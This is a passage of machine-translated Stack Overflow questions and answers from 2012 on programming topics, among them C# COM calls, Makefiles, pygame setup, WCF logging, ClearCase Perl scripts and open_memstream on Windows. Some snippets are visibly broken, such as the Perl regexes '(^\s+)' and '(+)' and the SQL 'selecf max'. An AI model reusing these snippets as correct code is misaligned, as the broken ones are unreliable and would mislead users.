使用 COM (VbScript) 我可以在不等待它返回的情况下触发一个方法，所以我想以同样的方式使用 C#。

VbScript 代码：

```
Dim qtApp
Set qtApp = CreateObject("QuickTest.Application")
qtApp.Open("C:\Temp\Test")

qtApp.Run   '// VbScript does not wait for this method to finish

Set qtApp = Nothing 
```

C# 代码：

```
//Refer the object
var qtApp = new QuickTest.Application();
//Open the test
qtApp.Open("C:\\Temp\\Test");

qtApp.Test.Run(); //<<== @ this step my code is waiting for the Run method to return
qtApp.Test.Pause(); //<<== This line is never executed until Run returns 
```

注释：

1.  引用的对象 ( `QuickTestApplication`) 是 COM 对象，具有 Run 和 Pause 的方法（如上面的代码中所述）。
2.  对我来说`QuickTestApplication`是一个黑匣子
3.  我不想使用`Thread`or `ASync`（基本上是线程），但是`QuickTestApplication`内置方法

如果可以使用 C# 完成，我真的在寻找简单的答案

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T19:54:37.990

异步执行它。

[http://msdn.microsoft.com/en-us/library/2e08f6yc.aspx](http://msdn.microsoft.com/en-us/library/2e08f6yc.aspx)
[http://msdn.microsoft.com/en-us/magazine/cc301332.aspx](http://msdn.microsoft.com/en-us/magazine/cc301332.aspx)

> .NET Framework 使您能够异步调用任何方法。为此，您定义一个与您要调用的方法具有相同签名的委托；公共语言运行时自动为此委托定义 BeginInvoke 和 EndInvoke 方法，并带有适当的签名。
> 
> BeginInvoke 方法启动异步调用。EndInvoke 方法检索异步调用的结果。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T19:58:50.653

您可以使用“任务”，并在其中运行该方法。我还没有使用过这些，但我相信这是它们在 C# 中的用途。

从 MSDN (http://msdn.microsoft.com/en-us/library/dd537609.aspx)：

“一个任务代表一个异步操作，在某些方面它类似于创建一个新线程或线程池工作项，但在更高的抽象级别。任务提供两个主要好处：

更高效、更可扩展地使用系统资源。

在幕后，任务排队到线程池，该线程池已通过算法（如爬山）进行了增强，该算法可确定并调整线程数以最大限度地提高吞吐量。这使得任务相对轻量级，您可以创建许多任务以启用细粒度并行性。为了补充这一点，采用了广为人知的工作窃取算法来提供负载平衡。

比线程或工作项更多的编程控制。

任务和围绕它们构建的框架提供了一组丰富的 API，支持等待、取消、继续、强大的异常处理、详细状态、自定义调度等。

由于这两个原因，在 .NET Framework 4 中，任务是编写多线程、异步和并行代码的首选 API。”

```
// Create a task and supply a user delegate by using a lambda expression.
var taskA = new Task(() => Console.WriteLine("Hello from taskA."));

// Start the task.
taskA.Start();

// Output a message from the joining thread.
Console.WriteLine("Hello from the calling thread.");

/* Output:
* Hello from the joining thread.
* Hello from taskA. 
*/ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-25T06:44:19.373

QTP 自动化允许异步运行测试，查看文档：

![运行方法的文档](../Images/34d4fa88d21f061295ad668fdcb64dbe.png)

因此，您必须提供默认的结果选项，`Run`然后指定`Test``False``WaitOnReturn`

```
Set resOpt = CreateObject("QuickTest.RunResultsOptions")
qtApp.Test.Run resOpt, False 
```

# ios - 从 iOS 应用程序访问单个文件的廉价或免费托管

> ID：10305070
> 
> 赞同：0
> 
> 时间：2012-04-24T19:53:01.680
> 
> 标签：ios, hosting, google-docs, dropbox

我需要在某处存储一个非常小的文件，以便在我正在构建的 iOS 应用程序上动态更新列表。有没有像这样的地方的托管解决方案，只有一个文件可以由我定期更新，但仍然动态填充 iOS 应用程序？Dropbox 会为这样的事情工作吗？还是谷歌文档？

更新 * 只是为了解释得更好一点。我需要确定 Dropbox 是否能够处理这样的任务（有多个请求等），或者是否有一个既定的替代方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:00:45.260

我正在使用保管箱。您只需将列表文件存储在保管箱的公用文件夹中并从那里访问它。

# c++ - 无法使用来自不同目录中不同源文件的 Makefile 进行编译

> ID：10305072
> 
> 赞同：0
> 
> 时间：2012-04-24T19:53:06.567
> 
> 标签：c++, makefile

我有一个具有此目录结构的 C++ 项目：

```
src
├── database
│   ├── database.hpp
│   ├── leveldb.cpp
│   └── leveldb.hpp
├── Makefile
└── server.cpp 
```

server.cpp 包括“database/database.hpp”和“database/leveldb.hpp”。leveldb.cpp 包括“leveldb.hpp”

到目前为止，我的 Makefile 是这样的（请记住，$LEVELDB 是 Google 的 leveldb 库的路径，与我的 leveldb.hpp 和 cpp 文件不同，它们代表一个定制的类）：

```
CC=g++
LEVELDB=/route/to/Googles/library/leveldb
BOOST=/route/to/boost/cpp-netlib-0.9.2

DATABASE=/route/to/my/project/src/database

CFLAGS=-I$(LEVELDB)/include -I$(BOOST) -Wall -O2
LDFLAGS=-L$(LEVELDB) -lleveldb -lpthread -lboost_system -lboost_thread -pthread

all:server

server: server.cpp database/leveldb.cpp
    $(CC) -o $@ $(CFLAGS) -I$(DATABASE) $< $(LDFLAGS) -L$(DATABASE) 
```

我无法编译它。它给了我一个错误“未定义的对 `LevelDB::LevelDB(std::basic_string, std::allocator >)' 的引用”，我知道这是由于 Makefile 造成的编译错误，因为当我把它全部放入时一切正常一个单一的源文件。

我非常感谢你的帮助。

谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:27:08.250

您还没有告诉我们您是否尝试`make`（或`make all`或`make server`）或`make servidor`。无论哪种方式，问题在于您没有将`leveldb`定义链接到您的目标。

在这个规则中：

```
servidor: server.cpp database/leveldb.cpp
    $(CC) -o $@ $(CFLAGS) -I$(DATABASE) $< $(LDFLAGS) -L$(DATABASE) 
```

您正在使用自动变量`$<`，这意味着第*一个*先决条件 ( `server.cpp`)。您应该使用`$^`，这意味着*所有*先决条件 ( `server.cpp database/leveldb.cpp`)。

如果您`make`或`make all`或`make server`，Make 将尝试使用未提及`server`的`server.cpp`默认规则进行构建`leveldb.cpp`。您确定不希望规则为“all:servidor”吗？

# r - 在 R 中根据数据框中的其他列创建新变量

> ID：10305073
> 
> 赞同：1
> 
> 时间：2012-04-24T19:53:14.927
> 
> 标签：r

我有两列的数据框，说“a”和“b”，现在我想创建另一列“c”，如果满足以下条件，它将取值为 1：

a>x 并且在这个子集中 b>y。x 和 y 是任意常数。条件有点嵌套。因此，如果 a>x 返回 25 个观察值，则 b>y 将在该 25 个观察值内搜索，而不是在整个数据帧内搜索。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:09:15.513

我真的怀疑如果你尝试了一些东西，你可能已经知道了......

```
R> x <- data.frame(a=1:10,b=10:1)
R> (x$c <- x$a > 3 & x$b > 4)
    a  b     c
1   1 10 FALSE
2   2  9 FALSE
3   3  8 FALSE
4   4  7  TRUE
5   5  6  TRUE
6   6  5  TRUE
7   7  4 FALSE
8   8  3 FALSE
9   9  2 FALSE
10 10  1 FALSE 
```

# eclipse - 如何使用 Eclipse 设置 pygame？

> ID：10305076
> 
> 赞同：3
> 
> 时间：2012-04-24T19:53:29.483
> 
> 标签：eclipse, macos, pygame, pydev

Edit3：附加信息：我能够在 Windows 上运行 Eclipse/pygame 组合......只是在 MacOSX 上没有。

* * *

Edit2：从 shell 编译也可以。现在只是 Eclipse :) 我在 Eclipse 中尝试过的内容：

对于解释器，我使用自动配置，它建议`/usr/bin/python`作为解释器。然后对于 PYTHONPATH，他建议了所有默认的东西，然后我添加`/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages`了其余的东西。我仍然在代码中有未解决的包“语法”错误，但是在编译时他抱怨的唯一错误是没有合适的 64 位架构。

`../Python.framework/Versions/2.7/lib/python2.7/site-packages/pygame/base.so: no appropriate 64-bit architecture (see "man python" for running in 32-bit mode)`

* * *

编辑：我现在已经能够`import pygame`在 IDLE 中初始化 pygame。在 Eclipse 中，我将 pygame 路径添加到 PYTHONPATH 但 Eclipse 抱怨架构。

* * *

我想将 pygame 与 Eclipse、Pydev 和 Python 2.7 结合使用。

首先我下载了​​ Python 2.7.3 并安装了它。为了能够在 IDE 中工作，我在 Eclipse 上安装了 Pydev。一切正常，我可以在 Eclipse 中使用 Pydev 和我测试的程序运行没有问题。

然后我继续下载 pygame 并安装它。（[pygame下载](http://pygame.org/ftp/pygame-1.9.1release-python.org-32bit-py2.7-macosx10.3.dmg)）

现在当我尝试：

```
import pygame
pygame.init() 
```

Eclipse 告诉我：`unresolved import: pygame`当我尝试编译时，我收到以下消息：

```
Traceback (most recent call last):
File "/Users/name/Documents/workspace/test_unit/main.py", line 6, in <module>
import pygame
ImportError: No module named pygame 
```

此外，当我启动 IDLE 应用程序并尝试在那里导入 pygame 时，我收到以下错误：

```
Traceback (most recent call last):
File "<pyshell#1>", line 1, in <module>
import pygame
File "/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-    packages/pygame/__init__.py", line 95, in <module>
from pygame.base import *
ImportError: dlopen(/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-    packages/pygame/base.so, 2): no suitable image found.  Did find:
/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pygame/base.so: no matching architecture in universal wrapper 
```

但是，如果我`open Module...`通过 IDLE 使用然后打开 pygame，则找到该模块。我错过了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-25T16:19:46.580

好的，我找到了如何让它工作的解决方案。关键问题是 Eclipse 选择了“错误”的解释器。Eclipse 选择适用于普通的 python 东西，但是当尝试编译 pygame 东西时它变得复杂并且我得到架构错误。

所以我做了什么：

1.  [在此处](http://www.eclipse.org/downloads)获取 Eclipse Classic 3.7.2 32 位并安装它。
2.  为 Eclipse 安装 pydev（[此处](http://pydev.org/manual_101_install.html)的说明）
3.  获取适用于 Mac OS X 10.3 的 Python 2.7.3（[此处](http://python.org/download/releases/2.7.3/)）并安装它
4.  获取 Python 2.7 的 Pygame 1.9.1 32 位（[此处](http://www.pygame.org/download.shtml)）并安装它

现在到适当的解释器。去`Eclipse->Settings->PyDev->Interpreter - Python`那里创建一个`New...`解释器。对我有用的一个位于`/Library/Frameworks/Python.framework/Versions/2.7/bin`. 只需选择`python`将链接到正确的别名的别名。

现在确保你的 pygame 在你的 PYTHONPATH 中。为此，只需`New Folder`在当前菜单的下半部分添加 a 并导航到您的 pygame 路径（默认为`/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages`）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-04-12T14:08:16.393

在阅读了您的三个编辑后，似乎存在架构问题。由于 PyGame 不能在 64 位平台上运行，所以本例需要选择 32 位的 Python 解释器。

转到`Eclipse->Preferences->PyDev->Interpreters->Python Interpreter`并添加一个新的 32 位 python 解释器。32 位 python 解释器的路径很可能与您通常的 python 解释器相同，只是文件名为“python2.7-32”而不是“python2.7”（如果 python 版本是 2.7）。所以，对我来说是：`"/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7-32"`。

设置完成后，您可以将其设为默认解释器，也可以 `Project->Properties->PyDev - Interpreter/Grammar`在使用 PyGame 时从中选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T22:17:17.447

[为 Mac OS X 10.6.8 安装 Pygame](https://stackoverflow.com/questions/8275808/installing-pygame-for-mac-os-x-10-6-8)

读一读，看起来您可能正在尝试混合和匹配 32/64 位库。这可能需要您安装正确版本的 python 以匹配您的开发环境或 pygame 以匹配您的开发环境。

我之前在需要 32 位库的 64 位系统上遇到过这个问题。修复是强制 python 在 32 位模式下运行。

强制其进入 32 位模式的修复程序包含在该页面上

> 别名 python='arch -i386 /usr/bin/python[版本]'

其中版本当然是你的版本。

如果您在 Windows 上，我相信您也可以做类似的事情，尽管我不确定如何在 Windows 中为命令起别名。

# redirect - 强制重定向移动设备？

> ID：10305077
> 
> 赞同：0
> 
> 时间：2012-04-24T19:53:33.337
> 
> 标签：redirect, mobile

我正在开发一个网站，我们正在为手机构建一些页面。

我们是否应该强制移动用户访问移动网站或向他们提供选择移动或常规视图的选项。

我知道几乎所有的移动网站都没有给你选择的机会，如果你想出一个移动设备，他们只会强迫你进入移动网站。

最佳做法是什么？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T19:57:48.980

最好的选择是让您的移动网站专门针对移动设备进行设计，并且不会缺少任何功能。他们应该是相同的，但布局应该不同，这样他们会更喜欢手机上的手机版和电脑上的电脑版。然后，如果你强迫他们也没关系，他们无论如何都会选择移动设备。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:01:45.563

MTDetect 在您的桌面网站上。

根据您要服务的设备/分辨率自动重定向到您的移动网站。

在移动网站上提供“桌面”链接以将用户带回桌面网站。

或者，您可以在您的桌面上设置一种机制，以允许用户仅使用 cookie 来“订阅”桌面网站。您的桌面代码将查找 cookie，如果它不存在，则 MTDetect 将触发并重定向到移动设备。

一种更高级的方法是构建一个与设备无关的响应式布局，该布局将自身塑造成设备/桌面浏览器的尺寸。

# jquery - 将 JSON 对象转换为 URL 参数/MVC3/JQuery

> ID：10305080
> 
> 赞同：0
> 
> 时间：2012-04-24T19:53:50.997
> 
> 标签：jquery, json, asp.net-mvc-3

如果我有这样的对象数组......

```
var p = [{ 'first': 'John', 'last': 'Doe' }, { 'first': 'Sue', 'last': 'Smith' }]; 
```

我需要将它附加到这样的 URL...

```
/myapp/myaction?p[0].first=John&p[0].last=Doe&p[1].first=Sue&p[1].last=Smith 
```

JQuery 中有什么东西可以帮助我做到这一点而无需手动处理吗？

基本上，我有一个像 people 数组这样的对象，我需要以它可以理解并绑定到列表的格式将它发送到 ASP MVC3。MVC3 理解以“点”格式编码的嵌套项（例如 p[0].first）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T19:59:30.357

可能有更好的方法，但这样的事情应该有效：

```
var params = $.map(p, function(n, i){
    return "p[" + i + "].first=" + n.first + "&p[" + i + "].last=" + n.last;
}).join("&"); 
```

如果对象的属性是动态的，您可以使用 a`for...in`来循环它们。

# wcf - 在服务器上记录 WCF 请求的请求和响应值

> ID：10305084
> 
> 赞同：0
> 
> 时间：2012-04-24T19:54:09.613
> 
> 标签：wcf

我可以在这里看到与此类似的问题，但没有特别相同的问题。

我有一个 WCF 公共 API，客户端可以使用 API 密钥进行查询。所以像：

```
string GetDataForRegion(string apiKey, int regionId); 
```

我需要能够记录这些请求以及发送回客户端的数据。我可以使用**IDispatchMessageInspector**获得响应，但看不到在哪里可以获得请求参数。

我可以看到使用**IParameterInspector**可以做到这一点，但是如何将请求和响应联系在一起？

理想情况下，我想将这样的内容写入日志（在数据库中）：

*日期时间、APIKey、方法调用、参数、响应*

Sp，使用上面的示例，它将是：

*2012-04-24-15-52-11，myapikey，GetDataForRegion，{ regionId：1}，[响应数据]*

这在 WCF 内置的任何东西中都可能吗？

谢谢，

ķ

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T21:42:20.007

`IParameterInspector`是你想要的。在服务器端，在`BeforeCall`调用您的用户代码之前调用该方法，并且您可以从该方法返回一个状态值（通常这将是 a`Guid`但它可以是任何东西。）一旦您的服务运行并产生返回值，`AfterCall`将使用匹配的相同状态值调用`BeforeCall`。在客户端，它的工作方式基本相同，只是调用发生在往返服务器之前和之后。

在您的情况下，分阶段记录信息可能是最简单的。在入站调用期间将请求数据插入数据库，并从调用中返回一些唯一标识符（身份字段、时间戳等）。在回程中，使用响应数据更新匹配记录。这也为您提供了一种快速的方法来查看呼叫花费了多长时间，以及是否有任何呼叫未能返回，例如。

以下是对这些工作原理的简短介绍，并附有代码：

[http://blogs.msdn.com/b/endpoint/archive/2011/04/28/wcf-extensibility-iparameterinspector.aspx](http://blogs.msdn.com/b/endpoint/archive/2011/04/28/wcf-extensibility-iparameterinspector.aspx)

您也可以`IDispatchMessageInspector`用于相同的目的，它的工作原理基本相同，但您必须自己撕开`Message`物体；参数检查器可能是一个更好的选择。消息检查器更强大，并且似乎更常用，即使对于有“更简单”选项的事情也是如此；看：

[http://blogs.msdn.com/b/carlosfigueira/archive/2011/04/19/wcf-extensibility-message-inspectors.aspx](http://blogs.msdn.com/b/carlosfigueira/archive/2011/04/19/wcf-extensibility-message-inspectors.aspx)

# java - 如何嵌入 LDAP 服务器以提供自定义数据

> ID：10305086
> 
> 赞同：1
> 
> 时间：2012-04-24T19:54:13.510
> 
> 标签：java, ldap, embed

我使用了一个闭源应用程序，它可以配置为使用 LDAP 目录来获取用户的组成员资格。LDAP查询可以随意配置。现在我需要集成来自提供 API 的应用程序的各种资源。

我可以做到这一点（伪代码）

```
String[] getGroupmembershipsFromAll( String username ) {
  String[] groups = new String[];

  groups.add( ApiForAppOne.getUserGroups( username ) );
  groups.add( ApiForAppTwo.getUserGroups( username ) );
  groups.add( ApiForAppThree.getUserGroups( username ) );

  return groups;
} 
```

我的想法是通过实现 LDAP RFC 的“东西”来公开这个功能。最后一步是使用 servername:389 和以下查询配置应用程序：

```
(username='username@domain') 
```

（所有来源用来识别用户的通用标准是用户@域形式的 Windows AD 主体）

你知道实现这一目标的方法吗？实施 RFC4511 可能是解决方案，但我不想从头开始，因为 RFC 很长。也许基于 OpenDS/OpenDJ 或 ApacheDS 构建一些东西是一个可行的解决方案，但我不知道它们是在设计时考虑到这一点的。另一方面，一个优雅的解决方案可能是将 API 结果保存在 LDAP 中，但我不知道是否必须再次使用 JPA 检索这些数据，或者使用 LDAP 查询检索它是否有效。我读了一些关于 uboundid LDAP 服务器 SDK 的内容，也许这是另一种选择。

所有这些都只是想法，我在这方面没有经验。想法非常感谢。

* * *

非常感谢您提供这些信息。我查看了 unboundid sdk 和启动 ldap 服务器并导入 ldif 的示例。但是你关于生产性使用的评论让我觉得我可能会考虑一个不同的解决方案，尽管当我需要编写 jndi 或 ldap 单元测试时我肯定会回到 unboundid 。

我现在能够更好地描述我的需求，也许这可以通过 unboundid 来实现，或者你知道另一个让我实现这一目标的解决方案。我需要拦截查询，然后调用 API（参见上面的示例）以检索数据，然后将其提供给底层 ldap 目录。也许 unboundid 提供了一个接口。你知道吗？或者更多关于 ApacheDS 的设计？这种拦截的原因是我可以查询的应用程序包含大约 100000 个条目，我只想将这些复制到需要的 ldap。

在写这篇文章时，我看到了另一种选择：也许可以做一些 aop 来拦截呼叫。你怎么看 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T00:34:44.137

如果您可以使用真正的 LDAP 服务器，我当然会这样做：您会发现它向前迈出了一大步。例如，OpenLDAP 运行良好，而且价格合适。

否则已经有嵌入式 LDAP 服务器了。@Terry Gardner 经常在这里发布的 UnboundID SDK 包含其中之一。我没有从属关系：他可能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-27T06:39:35.740

[ldapjs](http://ldapjs.org/)可以做到这一点，但在 Node.js 中，不是 Java。[ruby-ldapserver](https://rubygems.org/gems/ruby-ldapserver)类似，但在 Ruby 中。我目前正在寻找 Java 中的类似物。

# clearcase - ClearCase 项目间交付

> ID：10305087
> 
> 赞同：1
> 
> 时间：2012-04-24T19:54:16.210
> 
> 标签：clearcase

进行项目间交付时运行的最佳命令是什么？我喜欢查找合并的内容，而 findmerge 似乎不太容易使用，所以我想知道还有什么可用的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:11:39.190

您可以从[`cleartool deliver`手册页](http://publib.boulder.ibm.com/infocenter/cchelp/v7r0m0/index.jsp?topic=/com.ibm.rational.clearcase.cc_ref.doc/topics/ct_deliver.htm)尝试：

> ### 预览交付操作：

```
deliver –pre/view [ –s/hort | –l/ong ] [ –str/eam stream-selector ]
    [ –to integration-view-tag] [ –tar/get stream-selector ]
    [ –cac/t | –act/ivities activity-selector ...
    | –bas/elines baseline-selector ... ] 
```

确保**目标项目的交付策略授权相互交付**：请参阅“[如何在 UCM 中将基线从一个项目交付到另一个项目？](https://stackoverflow.com/questions/10005364/how-to-deliver-a-baseline-from-one-project-to-another-project-in-ucm/10005469#10005469) ”。

* * *

[这个线程](http://www.ibm.com/developerworks/forums/thread.jspa?threadID=262178)实际上引用了一个解析输出的 perl 脚本`cleartool deliver -preview`。
这是一个摘录（虽然不是完整的脚本）

```
$deliver = 0;
$delmsg = "";
$sendmail = 0;
$mailprio = "";
$cmd = "cleartool deliver -preview -stream $stream";
print ("CMD ==> $cmd\n");
system ("echo $cmd >>$logfile");
$ct_out = `$cmd 2>&1 | $tee -a $logfile`;
print ("$ct_out\n\n");
if ($ct_out =~ /Changes will be POSTED/) {
    $deliver = 1;
    $sendmail = 1;
    $delmsg = "Changes to be delivered";
    print ("$delmsg\n");
    system ("echo $delmsg >>$logfile");
    $cmd = "cleartool deliver -force -stream $stream";
    print ("CMD ==> $cmd\n");
    system ("echo $cmd >>$logfile");
    system ("$cmd 2>&1 | $tee -a $logfile");
} elsif ($ct_out =~ /Deliver operation already in progress/) {
    $deliver = 0;
    $delmsg = "DELIVERY ALREADY IN PROGRESS";
    print ("$delmsg\n");
    $sendmail = 1;
} elsif ($ct_out =~ /No activities to deliver/) {
    $deliver = 0;
    $delmsg = "No activities to deliver";
    print ("$delmsg\n");
} elsif ($ct_out =~ /There are checkouts in activities/) {
    $deliver = 0;
    $delmsg = "UNABLE TO DELIVER DUE TO CHECKOUTS";
    print ("$delmsg\n");
    $sendmail = 1;
    $mailprio = "-priority 1";
} elsif ($ct_out =~ /Unable to start a deliver operation while a rebase operation is in progress/) {
    $deliver = 0;
    $delmsg = "UNABLE TO DELIVER DUE TO REBASE IN PROGRESS";
    print ("$delmsg\n");
    $sendmail = 1;
    $mailprio = "-priority 1";
} else { 
    $deliver = 0;
    $delmsg = "FAILED TO DETERMINE STATUS";
    $toaddr = $toaddr2;
    print ("$delmsg\n");
    $sendmail = 1;
    $mailprio = "-priority 1";
} 
```

* * *

如果您只想查看相关活动，[该线程建议](http://www.ibm.com/developerworks/forums/thread.jspa?threadID=84680)：

```
#!/usr/bin/perl -w
use strict;

my $streamSelector = 'stream@pvob'; # here you should specify the actual stream selector

#    HASH structure
#    activity-to-deliver => http://activity-depend-on, ...

my %dependency;

#    Get all new activities that can be delivered

my $cmd = "cleartool deliver -preview -stream $streamSelector";
open(ACTIVITIES, "$cmd|") or die("Error: $!\n");
while (<ACTIVITIES>)
{
  chomp;
  if (m/^\s+activity:(^\s+)\s+/)
  {
    $dependency{$1} = [];
  }
}
close(ACTIVITIES);

#    Get dependency of all the activities

foreach my $activity (sort(keys(%dependency)))
{
  $cmd = "cleartool deliver -preview -stream $streamSelector -activities $activity";

  open(DELIVER, "$cmd 2>&1 |") or die("Error: $!\n");
  while (<DELIVER>)
  {
    chomp;
    if (m/^cleartool: Error: Activity \"(+)\" must be added to activity list\.$/)
    {
      push(@{$dependency{$activity}}, $1);
    }
  }
  close(DELIVER);
}

#    Output result

foreach (sort(keys(%dependency)))
{
  print("$_\n");
  foreach (sort(@{$dependency{$_}}))
  {
    print("\t$_\n");
  }
  print("\n");
} 
```

# ruby-on-rails - Rails ActiveRecord 只选择最后一个 id 的项目

> ID：10305091
> 
> 赞同：0
> 
> 时间：2012-04-24T19:54:32.727
> 
> 标签：ruby-on-rails, activerecord, join

我有 2 个模型，Video 和 ZencoderJob。每个视频`has_many`zencoder_jobs 和 zencoder_job`belongs_to`一个视频。

现在因为一个视频可以有多个作业（当您更改视频文件时它会生成一个新的编码作业），所以有许多具有不同编码状态的作业。我使用“处理”和“完成”来了解视频何时可以通过 API 显示。

这是我来自 video.rb 的实际查询

```
def self.finished_and_active(limit, offset)
  limit(limit || 30)
  .offset(offset.to_i || 0)
  .order("id DESC")
  .where(:active => true)
  .joins(:zencoder_jobs).where(:zencoder_jobs => { :encoded_state => "finished" })
  .uniq
end 
```

问题是，如果一个视频有 3 个作业，2 个旧作业和 1 个新作业，旧作业的编码状态为“已完成”，而新作业具有“处理”。它不查找作业的最后一个 ID，但如果有任何作业，无论是旧的还是新的，都带有“已完成”，它会将其显示给 API。

我试过了

```
.joins(:zencoder_jobs).where(:zencoder_jobs => { :encoded_state => "finished" }).last.uniq 
```

但由于“last”而引发错误。任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:34:17.793

你可以通过使用一些 SQL 魔法来解决这个问题。在 where 部分，插入`selecf max(zencoder_jobs.id) from zencoder_jobs where id = zencoder_jobs_id) = zencoder_jobs_id`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:52:16.510

您可以尝试使用 join .Ex 的附加选项

```
Video.joins('LEFT JOIN zencoder_jobs ON  zencoder_jobs.video_id = video.id AND zencoder_jobs.encoded_state = "finished" ') 
```

这将为您收集视频并需要加入 zencoder_jobs

# javascript - 将 XSL 字符串传递给 Javascript

> ID：10305093
> 
> 赞同：0
> 
> 时间：2012-04-24T19:54:39.343
> 
> 标签：javascript, xslt

我正在尝试将字符串从 XSL 传递给 Javascript。我能够传递整数，但它似乎不接受字符串。以下是我的代码的基本结构。如果我从“测试 1”中删除“测试”，我会得到编号为 1 的警报框。但是一旦里面有文本，警报框就不会出现。

XML:

```
<TEST>
  <TITLE>Test 1</TITLE>
<TEST>

<TEST>
  <TITLE>Test 2</TITLE>
<TEST> 
```

XSL：

```
<xsl:for-each select="//TEST">
<xsl:call-template name="TEST_TEMPLATE"/>
</xsl:for-each> 
```

...

```
<xsl:template name="TEST_TEMPLATE">

<script type="text/javascript">
<![CDATA[var title = ]]><xsl:value-of select="./TITLE" /><![CDATA[;

alert(title);]]>
</script> 
```

非常感谢您的帮助。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T22:19:57.697

您不是“将字符串从 XSL 传递到 Javascript”。您的 XSLT 代码正在生成 HTML，其中一部分恰好是脚本元素。很容易看出您正在生成的脚本元素包含以下文本：

var 标题 = 测试 1；

在执行时，这显然不会做任何有用的事情。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:09:59.667

你需要在标题周围加上引号。您刚刚输出字符串的值的模板，但它必须在 qoutes 中才能成为有效的 javascript。我认为这会起作用：

```
<xsl:template name="TEST_TEMPLATE">

<script type="text/javascript">
<![CDATA[var title = "]]><xsl:value-of select="./TITLE" /><![CDATA[";

alert(title);]]>
</script> 
```

# c - 我可以用 malloc 和隐式转换替换对 open_memstream 的调用吗？

> ID：10305095
> 
> 赞同：7
> 
> 时间：2012-04-24T19:54:56.587
> 
> 标签：c, windows, stream, malloc

全部，

我有一个打印到流的程序。我需要将此流缓冲在内存中，然后根据需要将每一行打印到实际文件中。

由于`fprintf()`函数调用必须有一个`FILE *`指针，我需要说内存中的指针寻址空间。我曾使用过该`open_memstream()`功能，但 Windows 不支持此功能。

由于`malloc()`返回一个`void *`指针，该指针根据需要神奇地转换为必要的指针，我可以将它用作我的`FILE *`指针吗？如果是这样，有什么注意事项？我需要注意空间不足吗？

**更新：**

在找到`open_memstream()`比应该更难的源之后，看起来他们正在对 malloc 的空间进行文件流。

既然是这样，而且我有他们的源代码，我会确定我是否无法获得一个工作版本来使用 mingw 交叉编译 windows。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-26T20:37:49.810

对于那些追随我的人，有希望！有一个解决方案。正如我的问题中所述，我使用`open_memstream()`的是 Windows 不支持的。

由于我有一个`File *`指针（不能更改为`char *`），我需要将它重定向到内存，直到稍后。由于我正在处理内存中的文件，因此我查看了`mmap()`. 它可以轻松解决问题，但同样，它只是 linux。

但是，windows 包含一个对`mmap()`被调用的推论`MapViewOfFile()`。通过我的魔力，`#ifdef`我可以使用任何必要的方法：

```
#ifdef WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#endif 
```

稍后，在 main 方法中，我调用`tmpfile()`了两个平台都支持的方法。这将为我打开一个流到一个有保证的唯一临时文件的流。现在我有了`FILE *`指针，我需要`mmap()`空间。但是`mmap()`需要一个文件描述符，而不是一个流，所以我使用该`fileno()`函数来获取新的文件描述符。

```
/* create tmp file and get file descriptor */
int fd;
yyout = tmpfile();
fd = fileno(yyout); 
```

现在我有更多`#ifdef`代码来确定需要使用哪个内存映射代码集。请注意两个版本之间映射空间的差异。Windows 地图`16384 bytes`和 linux 地图`4096 bytes`。这是因为 Windows 上的较小值段错误，如[我在此处的问题](https://stackoverflow.com/q/10339473/724357)中所述。

```
#ifdef WIN32
    HANDLE fm;
    HANDLE h = (HANDLE) _get_osfhandle (fd);

    fm = CreateFileMapping(
             h,
             NULL,
             PAGE_READWRITE|SEC_RESERVE,
             0,
             16384,
             NULL);
    if (fm == NULL) { 
            fprintf (stderr, "%s: Couldn't access memory space! %s\n", argv[0],  strerror (GetLastError()));
            exit(GetLastError());
    }
    bp = (char*)MapViewOfFile(
              fm,
              FILE_MAP_ALL_ACCESS,
              0,
              0,
              0);
    if (bp == NULL) { 
            fprintf (stderr, "%s: Couldn't fill memory space! %s\n", argv[0],  strerror (GetLastError()));
            exit(GetLastError());
    }
#else
    bp = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_FILE|MAP_PRIVATE, fd, 0);
    if (bp == MAP_FAILED) {
            fprintf (stderr, "%s: Couldn't access memory space! %s\n", argv[0], FileName, strerror (errno));
            exit(errno);
    }
#endif 
```

现在发生了一堆工作，其中数据被发送到`yyout`流中。最终该`flushData()`方法被调用。它以空终止字符结束流，刷新它，然后倒回它。然后，指向*内存空间*的指针与要打印到的正确流一起通过函数指针传递。

```
void flushData(void) {
    /* write out data in the stream and reset */ 
    while (currFields < headerFields) { fprintf(yyout, ",\"\""); currFields++; } 
    currFields = 0;
    fprintf(yyout, "%c%c%c", 13, 10, '\0');
    fflush(yyout);
    rewind(yyout);
    if (faqLine == 1) {
        faqLine = 0; /* don't print faq's to the data file */
    }
    else {
        (*printString)(outfile, bp);
        fflush(outfile);
    }
    fflush(yyout);
    rewind(yyout);
} 
```

这是可用于打印的功能之一。它遍历内存空间并打印每个字符，直到它遇到之前打印的空值。

```
